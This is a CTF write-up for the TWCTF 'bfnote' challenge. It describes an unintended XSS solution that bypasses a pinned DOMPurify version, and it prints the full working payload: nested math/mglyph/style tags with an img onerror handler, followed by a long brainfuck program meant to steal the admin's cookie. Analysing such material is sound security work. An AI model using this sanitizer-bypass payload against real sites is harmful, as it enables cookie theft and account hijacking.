# bfnote
This is **unintended** solution. For intended one see other writeups here: [https://ctftime.org/task/13089](https://ctftime.org/task/13089)

In this challenge we can make a POST request to the server containing brainfuck code. Then we can send the prepared brainfuck note to the admin. That suggests that the solution is XSS and the flag is somewhere in admin's cookie.

The code is displayed, but previously sanitized by DOMPurify:
```javascript
document.getElementById('program').innerHTML = DOMPurify.sanitize(program).toString();
```
and then executed - however, the result is also sanitized using:
```html
output = output.replaceAll('<', '&lt;').replaceAll('>', '&gt;')
```

The intended solution required us to use google recaptcha's callback mechanism. Fortunately for us (and unfortunately for challenge author...) a 1-day bug in DOMPurify has been announced and fixed during the CTF. As the challenge was using a pinned version of library, it was made possible to inject malicious code - with some little filtering on the way. The final payload:

```
[<math><mtext><table><mglyph><style><math><img src="x" onerror="window.output.innerHTML=window.output.innerText"><img src="x" onerror="window.output.innerHTML=window.output.innerText"></math>]----[---->+<]>---.-[--->+<]>.++++.------.-[--->+<]>--.---[->++++<]>-.-.++++[->+++<]>+.[--->++<]>-----.+[-->+<]>+++.----[->++++<]>.[---->+<]>++++.--.+++++[->+++<]>.-.---------.+++++++++++++..---.+++.[-->+<]>++++.+[-->+<]>+++.-[->+++<]>.[--->++<]>-----.[----->++++<]>.+++++++++++.------------.-[--->+<]>-.--------.--------.+++++++++.++++++.[++>---<]>.--[--->+<]>-.-[--->+<]>----.-------------.----.--[--->+<]>-.+++[->+++<]>.+[--->++<]>+.-[--->+<]>.-------.++++++++.--------.+++++++++.++++++.+[--->+<]>+.-.----[->+++<]>.++++.------.-----[->+++<]>+.++.-[-->+++<]>-.[->++++++<]>+.-[-->+<]>---.[--->++<]>-.-.++++[->+++<]>+.[--->++<]>-----.-[--->++<]>-.----[->+++<]>-.++++++++++++..----.+++.+[-->+<]>.-----------..++[--->++<]>+.[->+++<]>.---.++++++.+++++++..----.[->++++++++++<]>.[--->++<]>-.----------.+++++++++++.+++[->+++<]>.[->+++<]>.+[->++<]>+.++++.-[-->+<]>.[->++<]>-.--.-[++++>-----<]>.--.++.-----------.-[--->+<]>++.[-->+<]>++++.-----[->++<]>.[-->+<]>-.----.+++++++.--.[->++<]>-.--.-[-->+<]>---.+++[->++<]>+.+[-->+<]>+++..---[->++<]>.[-->+<]>----.-[--->+<]>++.[-->+<]>+++.----.++.--[->++<]>-.+.--.[-->+<]>.++++.--.+++.-----.[----->+<]>++.+++[-->+++<]>.[--->++<]>-----.-[--->++<]>-.++++.+[--->+<]>.+++++++++++.------------.-[--->+<]>-.--------.--------.+++++++++.++++++.[++>---<]>.--[--->+<]>-.++++++++++++..----.--.----.++++[->+++<]>.+[--->+++++<]>.+++++++++++.------------.-[--->+<]>-.--------.--------.+++++++++.++++++.[++>---<]>.+++[->++<]>.+++++++++++++.-----------.+[--->+<]>++.-----[++>---<]>.++[->++<]>+.-[++>-----<]>..-----------.+++++++++.----------.-[--->++<]>+.+[-->+++<]>++.+.+++.--------.-[->+++<]>-.+[--->+<]>.[->+++<]>.-------.---[->++<]>.
```
and the flag that made us aware this was not intended solution:
```
TWCTF{reCAPTCHA_Oriented_Programming_with_XSS!}
```
